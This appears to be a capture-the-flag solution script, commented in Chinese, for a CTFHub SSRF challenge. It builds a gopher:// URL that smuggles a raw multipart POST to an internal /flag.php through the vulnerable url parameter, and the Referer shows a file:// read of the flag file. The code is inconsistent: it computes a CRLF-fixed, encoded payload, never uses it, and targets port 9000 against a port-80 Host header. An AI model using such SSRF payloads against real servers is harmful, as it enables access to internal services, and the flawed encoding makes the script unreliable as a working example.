import urllib.parse

'''
ssrf
使用gopher协议构造内网访问请求包，经过2次url编码
'''
payload =\
"""
POST /flag.php HTTP/1.1
Host: 127.0.0.1:80
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-US;q=0.7,zh-TW;q=0.6
Cache-Control: max-age=0
Content-Length: 287
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary4B1rWGPUlAjOas01
DNT: 1
Origin: http://challenge-5359c152f2f2ad76.sandbox.ctfhub.com:10800
Referer: http://challenge-5359c152f2f2ad76.sandbox.ctfhub.com:10800/?url=file:///var/www/html/flag.php
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36 Edg/107.0.1418.62

------WebKitFormBoundary4B1rWGPUlAjOas01
Content-Disposition: form-data; name="file"; filename="fff"
Content-Type: application/octet-stream


------WebKitFormBoundary4B1rWGPUlAjOas01
Content-Disposition: form-data; name="submit"

提交
------WebKitFormBoundary4B1rWGPUlAjOas01--
"""
#注意后面一定要有回车，回车结尾表示http请求结束

tmp = urllib.parse.quote(payload)
new = tmp.replace('%0A','%0D%0A')
result = 'gopher://127.0.0.1:9000/'+'_'+payload
result = urllib.parse.quote(result)
print(result)       # 这里因为是GET请求所以要进行两次url编码
